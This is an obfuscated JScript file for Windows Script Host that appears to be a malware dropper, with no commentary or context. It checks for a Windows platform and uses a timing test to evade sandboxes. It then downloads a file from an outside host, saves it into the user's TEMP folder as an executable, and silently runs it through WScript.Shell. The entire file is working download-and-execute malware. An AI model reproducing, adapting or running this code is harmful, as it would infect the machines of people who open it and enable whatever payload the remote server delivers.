var _RI = false;
var _E = "CreateObject";
var _LO = function _AT() {return WScript[_E]("WScript"+".Shell");}(), _J = 11;
var _FP = "MSXML2.XMLHTTP";
var _HU = 2123213;
var _A0 = 0;
function _QU(_XP){_LO["Run"](_XP, _A0, _A0);};
function _CU(){return _FP + "";};
function _IO(_Q0, _X){_A0 = _A0 * 1; return _Q0 - _X;};
function _OR(){return _E;};
/*@cc_on
  @if (@_win32 || @_win64)
    _RI = true;
  @end
@*/
if (_RI)
{
var _Y = "";
function _K(){return 22;};
var _RK = 0; var _G0 = 0;
function _A()
{
var _UK = new this["Date"]();
var _RZ = _UK["getUTCMilliseconds"]();
WScript["Sleep"](_K());
var _UK = new this["Date"]();
var _B = _UK["getUTCMilliseconds"]();
WScript["Sleep"](_K());
var _UK = new this["Date"]();
var _BY = _UK["getUTCMilliseconds"]();
var _RK = "_G";
_RK = _IO(_B, _RZ);
var _G0 = "_AJ";
_G0 = _IO(_BY, _B);
_Y = "open";
return _IO(_RK, _G0);
}
var _V = false;
var _AF = false;
for (var _H = _A0; _H < _K() * 1; _H++){if (_A() != _A0){
_V = true; 
_G0 = "31" + 11 * _RK + _G0; 
_AF = true; 
break;
}}
function _S() {return ((_V == true) && (_V == _AF)) ? 1 : _A0;};
if (_V && _S() && _AF){
function _TN() {return _LO["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "RhdU7CY3PC3.ex" + "e";};
 _HE = _CU();
 _DU = WScript[_E](_HE);
 var _KN = 1;
 while (_KN){
try {
	if (_KN == 1)
	{
		_DU[_Y]("GET", "http://ru-optovik.ru/j9ssl", false);
		_DU["send"]();
		_W = "Sleep";
	}
	WScript[_W](_K() + 120); 
	if (_DU["readystate"] < 2 * 2) continue;
	_KN = _A0;
	function _N(_L) {var _Q = (1, 2, 3, 4, 5, _L); return _Q;};
	_MY = WScript[_OR()]("ADODB.Stream");
	_HE = _MY;
	_HE[_Y]();
	_HE["type"] = _N(1);
	_HE["write"](_DU["ResponseBody"]);
	_MY["position"] = _N(_A0);
	_HE["Save" + "ToFile"](_TN(), 2);
	_MY["cl"+"ose"]();
	_Z = _TN();
	_QU(_Z);
} catch(_PY){};
}
}
}

